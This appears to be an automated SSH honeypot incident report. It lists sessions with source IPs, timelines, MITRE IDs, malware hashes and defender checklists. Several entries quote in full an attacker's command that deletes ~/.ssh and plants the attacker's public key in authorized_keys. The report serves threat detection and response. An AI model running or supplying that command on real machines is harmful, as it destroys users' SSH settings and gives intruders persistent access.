| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-26 17:27 |
| **Last Seen** | 2026-05-26 17:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:27:25` | `cowrie.session.connect` |
| `2026-05-26 17:27:25` | `cowrie.client.version` |
| `2026-05-26 17:27:25` | `cowrie.client.kex` |
| `2026-05-26 17:27:26` | `cowrie.login.success` |
| `2026-05-26 17:27:27` | `cowrie.session.params` |
| `2026-05-26 17:27:27` | `cowrie.command.input` |
| `2026-05-26 17:27:27` | `cowrie.command.failed` |
| `2026-05-26 17:27:28` | `cowrie.log.closed` |
| `2026-05-26 17:27:28` | `cowrie.session.params` |
| `2026-05-26 17:27:28` | `cowrie.command.input` |
| `2026-05-26 17:27:29` | `cowrie.session.file_download` |
| `2026-05-26 17:27:29` | `cowrie.log.closed` |
| `2026-05-26 17:27:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d2ace0408cf

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-26 17:27 |
| **Last Seen** | 2026-05-26 17:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:27:31` | `cowrie.session.connect` |
| `2026-05-26 17:27:31` | `cowrie.client.version` |
| `2026-05-26 17:27:32` | `cowrie.client.kex` |
| `2026-05-26 17:27:32` | `cowrie.login.success` |
| `2026-05-26 17:27:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fafb2951b06a

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-26 17:28 |
| **Last Seen** | 2026-05-26 17:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:28:49` | `cowrie.session.connect` |
| `2026-05-26 17:28:49` | `cowrie.client.version` |
| `2026-05-26 17:28:50` | `cowrie.client.kex` |
| `2026-05-26 17:28:51` | `cowrie.login.success` |
| `2026-05-26 17:28:51` | `cowrie.session.params` |
| `2026-05-26 17:28:51` | `cowrie.command.input` |
| `2026-05-26 17:28:51` | `cowrie.command.failed` |
| `2026-05-26 17:28:52` | `cowrie.log.closed` |
| `2026-05-26 17:28:53` | `cowrie.session.params` |
| `2026-05-26 17:28:53` | `cowrie.command.input` |
| `2026-05-26 17:28:53` | `cowrie.session.file_download` |
| `2026-05-26 17:28:53` | `cowrie.log.closed` |
| `2026-05-26 17:28:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ddaa8f63ef9

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-26 17:28 |
| **Last Seen** | 2026-05-26 17:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:28:56` | `cowrie.session.connect` |
| `2026-05-26 17:28:56` | `cowrie.client.version` |
| `2026-05-26 17:28:56` | `cowrie.client.kex` |
| `2026-05-26 17:28:58` | `cowrie.login.success` |
| `2026-05-26 17:28:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3756407fcdde

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-26 17:29 |
| **Last Seen** | 2026-05-26 17:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:29:31` | `cowrie.session.connect` |
| `2026-05-26 17:29:31` | `cowrie.client.version` |
| `2026-05-26 17:29:31` | `cowrie.client.kex` |
| `2026-05-26 17:29:32` | `cowrie.login.success` |
| `2026-05-26 17:29:33` | `cowrie.session.params` |
| `2026-05-26 17:29:33` | `cowrie.command.input` |
| `2026-05-26 17:29:33` | `cowrie.command.failed` |
| `2026-05-26 17:29:33` | `cowrie.log.closed` |
| `2026-05-26 17:29:34` | `cowrie.session.params` |
| `2026-05-26 17:29:34` | `cowrie.command.input` |
| `2026-05-26 17:29:34` | `cowrie.session.file_download` |
| `2026-05-26 17:29:34` | `cowrie.log.closed` |
| `2026-05-26 17:29:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-556fdf5c58be

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-26 17:29 |
| **Last Seen** | 2026-05-26 17:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:29:37` | `cowrie.session.connect` |
| `2026-05-26 17:29:37` | `cowrie.client.version` |
| `2026-05-26 17:29:37` | `cowrie.client.kex` |
| `2026-05-26 17:29:38` | `cowrie.login.success` |
| `2026-05-26 17:29:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fce23aea2556

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-26 17:30 |
| **Last Seen** | 2026-05-26 17:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:30:13` | `cowrie.session.connect` |
| `2026-05-26 17:30:13` | `cowrie.client.version` |
| `2026-05-26 17:30:13` | `cowrie.client.kex` |
| `2026-05-26 17:30:14` | `cowrie.login.success` |
| `2026-05-26 17:30:15` | `cowrie.session.params` |
| `2026-05-26 17:30:15` | `cowrie.command.input` |
| `2026-05-26 17:30:15` | `cowrie.command.failed` |
| `2026-05-26 17:30:15` | `cowrie.log.closed` |
| `2026-05-26 17:30:16` | `cowrie.session.params` |
| `2026-05-26 17:30:16` | `cowrie.command.input` |
| `2026-05-26 17:30:16` | `cowrie.session.file_download` |
| `2026-05-26 17:30:16` | `cowrie.log.closed` |
| `2026-05-26 17:30:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3668a71a5a42

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-26 17:30 |
| **Last Seen** | 2026-05-26 17:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:30:19` | `cowrie.session.connect` |
| `2026-05-26 17:30:19` | `cowrie.client.version` |
| `2026-05-26 17:30:19` | `cowrie.client.kex` |
| `2026-05-26 17:30:20` | `cowrie.login.success` |
| `2026-05-26 17:30:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46facc4c0ba1

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-26 17:33 |
| **Last Seen** | 2026-05-26 17:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:33:44` | `cowrie.session.connect` |
| `2026-05-26 17:33:44` | `cowrie.client.version` |
| `2026-05-26 17:33:44` | `cowrie.client.kex` |
| `2026-05-26 17:33:45` | `cowrie.login.success` |
| `2026-05-26 17:33:46` | `cowrie.session.params` |
| `2026-05-26 17:33:46` | `cowrie.command.input` |
| `2026-05-26 17:33:46` | `cowrie.command.failed` |
| `2026-05-26 17:33:47` | `cowrie.log.closed` |
| `2026-05-26 17:33:47` | `cowrie.session.params` |
| `2026-05-26 17:33:47` | `cowrie.command.input` |
| `2026-05-26 17:33:47` | `cowrie.session.file_download` |
| `2026-05-26 17:33:47` | `cowrie.log.closed` |
| `2026-05-26 17:33:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d73a7ddebb5

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-26 17:33 |
| **Last Seen** | 2026-05-26 17:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:33:50` | `cowrie.session.connect` |
| `2026-05-26 17:33:50` | `cowrie.client.version` |
| `2026-05-26 17:33:51` | `cowrie.client.kex` |
| `2026-05-26 17:33:52` | `cowrie.login.success` |
| `2026-05-26 17:33:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8661c89cc547

| Field | Detail |
|---|---|
| **Source IP** | `112.219.104[.]42` |
| **First Seen** | 2026-05-26 17:34 |
| **Last Seen** | 2026-05-26 17:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:34:02` | `cowrie.session.connect` |
| `2026-05-26 17:34:02` | `cowrie.client.version` |
| `2026-05-26 17:34:03` | `cowrie.client.kex` |
| `2026-05-26 17:34:03` | `cowrie.login.success` |
| `2026-05-26 17:34:03` | `cowrie.session.params` |
| `2026-05-26 17:34:03` | `cowrie.command.input` |
| `2026-05-26 17:34:03` | `cowrie.command.failed` |
| `2026-05-26 17:34:04` | `cowrie.log.closed` |
| `2026-05-26 17:34:04` | `cowrie.session.params` |
| `2026-05-26 17:34:04` | `cowrie.command.input` |
| `2026-05-26 17:34:04` | `cowrie.session.file_download` |
| `2026-05-26 17:34:04` | `cowrie.log.closed` |
| `2026-05-26 17:34:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.219.104[.]42` to AbuseIPDB if not already reported
- [ ] Block `112.219.104[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dc5beaac7ae

| Field | Detail |
|---|---|
| **Source IP** | `112.219.104[.]42` |
| **First Seen** | 2026-05-26 17:34 |
| **Last Seen** | 2026-05-26 17:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:34:06` | `cowrie.session.connect` |
| `2026-05-26 17:34:06` | `cowrie.client.version` |
| `2026-05-26 17:34:06` | `cowrie.client.kex` |
| `2026-05-26 17:34:07` | `cowrie.login.success` |
| `2026-05-26 17:34:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.219.104[.]42` to AbuseIPDB if not already reported
- [ ] Block `112.219.104[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65b57c88d991

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-26 17:34 |
| **Last Seen** | 2026-05-26 17:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:34:25` | `cowrie.session.connect` |
| `2026-05-26 17:34:25` | `cowrie.client.version` |
| `2026-05-26 17:34:25` | `cowrie.client.kex` |
| `2026-05-26 17:34:26` | `cowrie.login.success` |
| `2026-05-26 17:34:27` | `cowrie.session.params` |
| `2026-05-26 17:34:27` | `cowrie.command.input` |
| `2026-05-26 17:34:27` | `cowrie.command.failed` |
| `2026-05-26 17:34:27` | `cowrie.log.closed` |
| `2026-05-26 17:34:28` | `cowrie.session.params` |
| `2026-05-26 17:34:28` | `cowrie.command.input` |
| `2026-05-26 17:34:28` | `cowrie.session.file_download` |
| `2026-05-26 17:34:28` | `cowrie.log.closed` |
| `2026-05-26 17:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-220608cd9af3

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-26 17:34 |
| **Last Seen** | 2026-05-26 17:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:34:31` | `cowrie.session.connect` |
| `2026-05-26 17:34:31` | `cowrie.client.version` |
| `2026-05-26 17:34:31` | `cowrie.client.kex` |
| `2026-05-26 17:34:32` | `cowrie.login.success` |
| `2026-05-26 17:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16efd1621b1e

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-26 17:36 |
| **Last Seen** | 2026-05-26 17:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:36:28` | `cowrie.session.connect` |
| `2026-05-26 17:36:28` | `cowrie.client.version` |
| `2026-05-26 17:36:28` | `cowrie.client.kex` |
| `2026-05-26 17:36:29` | `cowrie.login.success` |
| `2026-05-26 17:36:30` | `cowrie.session.params` |
| `2026-05-26 17:36:30` | `cowrie.command.input` |
| `2026-05-26 17:36:30` | `cowrie.command.failed` |
| `2026-05-26 17:36:30` | `cowrie.log.closed` |
| `2026-05-26 17:36:30` | `cowrie.session.params` |
| `2026-05-26 17:36:30` | `cowrie.command.input` |
| `2026-05-26 17:36:31` | `cowrie.session.file_download` |
| `2026-05-26 17:36:31` | `cowrie.log.closed` |
| `2026-05-26 17:36:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3035449ded4a

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-26 17:36 |
| **Last Seen** | 2026-05-26 17:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:36:35` | `cowrie.session.connect` |
| `2026-05-26 17:36:35` | `cowrie.client.version` |
| `2026-05-26 17:36:35` | `cowrie.client.kex` |
| `2026-05-26 17:36:36` | `cowrie.login.success` |
| `2026-05-26 17:36:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `190.81.117[.]162` | **20** | 2026-05-26 16:50 | 2026-05-26 17:18 | 1m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `35.237.94[.]18` | **20** | 2026-05-26 16:03 | 2026-05-26 16:35 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `40.82.214[.]8` | **20** | 2026-05-26 16:56 | 2026-05-26 17:27 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `183.166.94[.]133` | **15** | 2026-05-26 17:25 | 2026-05-26 17:37 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.196.56[.]74` | **2** | 2026-05-26 16:57 | 2026-05-26 17:00 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.206.225[.]242` | **2** | 2026-05-26 18:21 | 2026-05-26 18:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.163.15[.]238` | **2** | 2026-05-26 16:40 | 2026-05-26 16:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `110.166.87[.]119` | 1 | 2026-05-26 16:04 | 2026-05-26 16:04 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.219.104[.]42` | 1 | 2026-05-26 17:34 | 2026-05-26 17:34 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
